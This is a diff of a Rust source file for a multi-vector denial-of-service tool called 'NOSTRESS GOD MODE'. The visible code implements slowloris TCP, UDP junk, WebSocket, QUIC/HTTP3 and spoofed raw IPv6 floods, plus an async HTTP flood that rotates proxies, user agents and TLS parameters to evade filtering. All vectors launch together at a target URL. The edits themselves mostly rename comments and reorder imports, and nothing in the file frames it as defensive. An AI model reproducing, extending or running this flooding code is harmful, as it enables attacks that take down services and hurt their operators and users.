@@ -1,8 +1,8 @@
-// nostress_extreme.rs - SINGLE FILE SUPER BRUTAL
+// main.rs - NOSTRESS GOD MODE (single file, brutal async, multi-vector, all randomizer on top!)
 
 use std::{env, sync::Arc, time::{Duration, Instant}};
-use reqwest::{Client, Proxy, Method};
 use rand::{seq::SliceRandom, Rng};
+use reqwest::{Client, Proxy, Method};
 use tokio::sync::Semaphore;
 use futures::stream::{FuturesUnordered, StreamExt};
 
@@ -95,7 +95,7 @@ fn random_http_version() -> &'static str {
     versions.choose(&mut rand::thread_rng()).unwrap()
 }
 
-// -- RAW TCP SLOWLORIS STYLE --
+// -- SLOWLORIS TCP (async)
 async fn slowloris_attack(host: &str, port: u16, duration_sec: u64) {
     use tokio::net::TcpStream;
     use tokio::io::AsyncWriteExt;
@@ -113,13 +113,11 @@ async fn slowloris_attack(host: &str, port: u16, duration_sec: u64) {
                 stream.write_all(&[b]).await.ok();
                 tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(80..400))).await;
             }
-            // Never send body! (slowloris)
             tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
         }
     }
 }
-
-// -- RAW UDP JUNK --
+// -- UDP JUNK (async)
 async fn udp_junk(host: &str, port: u16, duration_sec: u64) {
     use tokio::net::UdpSocket;
     let sock = UdpSocket::bind("0.0.0.0:0").await.unwrap();
@@ -131,8 +129,7 @@ async fn udp_junk(host: &str, port: u16, duration_sec: u64) {
         tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(1..8))).await;
     }
 }
-
-// -- WEBSOCKET FLOOD --
+// -- WEBSOCKET FLOOD (async)
 async fn websocket_flood(host: &str, duration_sec: u64) {
     use tokio_tungstenite::connect_async;
     use url::Url;
@@ -144,19 +141,16 @@ async fn websocket_flood(host: &str, duration_sec: u64) {
         tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(9..90))).await;
     }
 }
-
-// -- QUIC/HTTP3 FLOOD --
+// -- QUIC/HTTP3 FLOOD (async)
 async fn quic_http3_flood(target_host: &str, target_port: u16, duration_sec: u64) {
     use quinn::{ClientConfig, Endpoint};
     use std::net::ToSocketAddrs;
     use tokio::io::AsyncWriteExt;
-
     let mut endpoint = Endpoint::client("0.0.0.0:0".parse().unwrap()).unwrap();
     endpoint.set_default_client_config(ClientConfig::with_native_roots());
     let server_addr = format!("{}:{}", target_host, target_port)
         .to_socket_addrs().unwrap().next().unwrap();
     let end = Instant::now() + Duration::from_secs(duration_sec);
-
     while Instant::now() < end {
         if let Ok(conn) = tokio::time::timeout(Duration::from_secs(2), endpoint.connect(server_addr, target_host)).await {
             if let Ok(c) = conn {
@@ -172,19 +166,16 @@ async fn quic_http3_flood(target_host: &str, target_port: u16, duration_sec: u64
         tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(10..50))).await;
     }
 }
-
-// -- RAW IPV6 SPOOF --
+// -- RAW IPV6 SPOOF (sync, root only!)
 fn raw_ipv6_spoof(target: &str, duration_sec: u64) {
     use pnet::transport::{transport_channel, TransportChannelType::Layer3};
     use pnet::packet::ipv6::MutableIpv6Packet;
     use std::net::Ipv6Addr;
     use std::str::FromStr;
-
     let protocol = Layer3(pnet::packet::ip::IpNextHeaderProtocols::Tcp);
     let (mut tx, _) = transport_channel(4096, protocol).unwrap();
     let end = Instant::now() + std::time::Duration::from_secs(duration_sec);
     let dst = Ipv6Addr::from_str(target).unwrap_or(Ipv6Addr::LOCALHOST);
-
     while Instant::now() < end {
         let mut buffer = [0u8; 64];
         let mut packet = MutableIpv6Packet::new(&mut buffer).unwrap();
@@ -211,7 +202,7 @@ async fn main() {
     let target = &args[4];
     let duration_sec = 45;
 
-    // Load all lists
+    // Load all lists (isi file2 txt sesuai sebelumnya)
     let proxies = Arc::new(load_file(proxyfile));
     let referers = Arc::new(load_file("referers.txt"));
     let useragents = Arc::new(load_file("useragents.txt"));
@@ -236,7 +227,7 @@ async fn main() {
 
     let mut handles = Vec::with_capacity(threads + 5);
 
-    // -- Brutal async HTTP flood --
+    // HTTP/HTTPS async flood (brutal!)
     for _ in 0..threads {
         let (paths, proxies, referers, useragents, ciphers, sigalgs, langs, accepts, encodings, controles) =
             (Arc::clone(&paths), Arc::clone(&proxies), Arc::clone(&referers), Arc::clone(&useragents),
@@ -354,17 +345,14 @@ async fn main() {
         }));
     }
 
-    // -- RAW TCP SLOWLORIS/FRAGMENTED (ultra gila), UDP, WebSocket, QUIC/HTTP3, RAW IPV6 SPOOF
+    // RAW TCP SLOWLORIS, UDP, WebSocket, QUIC/HTTP3, RAW IPV6 SPOOF
     if let Ok(url) = url::Url::parse(target) {
         if let Some(host) = url.host_str() {
             let port = url.port_or_known_default().unwrap_or(80);
             handles.push(tokio::spawn(slowloris_attack(host, port, duration_sec)));
             handles.push(tokio::spawn(udp_junk(host, port, duration_sec)));
             handles.push(tokio::spawn(websocket_flood(host, duration_sec)));
-            // QUIC/HTTP3 flood (port 443)
             handles.push(tokio::spawn(quic_http3_flood(host, 443, duration_sec)));
-
-            // RAW IPV6 spoof (hanya jika host IPv6)
             if host.contains(":") {
                 let h = host.to_string();
                 std::thread::spawn(move || raw_ipv6_spoof(&h, duration_sec));
@@ -375,5 +363,5 @@ async fn main() {
     for h in handles {
         let _ = h.await;
     }
-    println!("SELESAI (LEVEL GILA SUPREME)!");
+    println!("SELESAI (GOD MODE BRUTAL SUPREME)!");
 }
